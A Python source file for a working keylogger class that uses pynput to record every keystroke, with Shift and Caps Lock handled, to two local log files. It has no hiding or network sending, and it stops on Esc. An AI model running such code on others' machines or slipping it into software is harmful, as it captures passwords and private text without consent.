from pynput.keyboard import Key, Listener
import logging
from file_manager import write_to_version2_log

class KeyLogger:
    def __init__(self, log_file_version1='version1_log.txt', log_file_version2='version2_log.txt'):
        self.log_file_version1 = log_file_version1
        self.log_file_version2 = log_file_version2
        self._setup_logging()
        self.listener = None
        self.shift_pressed = False
        self.caps_lock_active = False

    def _setup_logging(self):
        logging.basicConfig(
            filename=self.log_file_version1,
            level=logging.DEBUG,
            format='%(asctime)s: %(message)s',
        )

    def on_press(self, key):
        try:
            char = key.char
            if self.caps_lock_active:
                char = char.upper() if not self.shift_pressed else char.lower()
            elif self.shift_pressed:
                char = char.upper()
            logging.info(f'Key {char} pressed')
            write_to_version2_log(self.log_file_version2, char)
        except AttributeError:
            logging.info(f'Special key {key} pressed')
            if key == Key.space:
                write_to_version2_log(self.log_file_version2, ' ')
            elif key == Key.enter:
                write_to_version2_log(self.log_file_version2, '\n')
            elif key == Key.tab:
                write_to_version2_log(self.log_file_version2, '\t')
            elif key == Key.backspace:
                write_to_version2_log(self.log_file_version2, 'BACKSPACE')
            elif key == Key.caps_lock:
                self.caps_lock_active = not self.caps_lock_active
            elif key in [Key.shift, Key.shift_r, Key.shift_l]:
                self.shift_pressed = True

    def on_release(self, key):
        if key in [Key.shift, Key.shift_r, Key.shift_l]:
            self.shift_pressed = False
        if key == Key.esc:
            return False

    def start(self):
        self.listener = Listener(on_press=self.on_press, on_release=self.on_release)
        self.listener.start()

    def stop(self):
        if self.listener is not None:
            self.listener.stop()
            self.listener = None
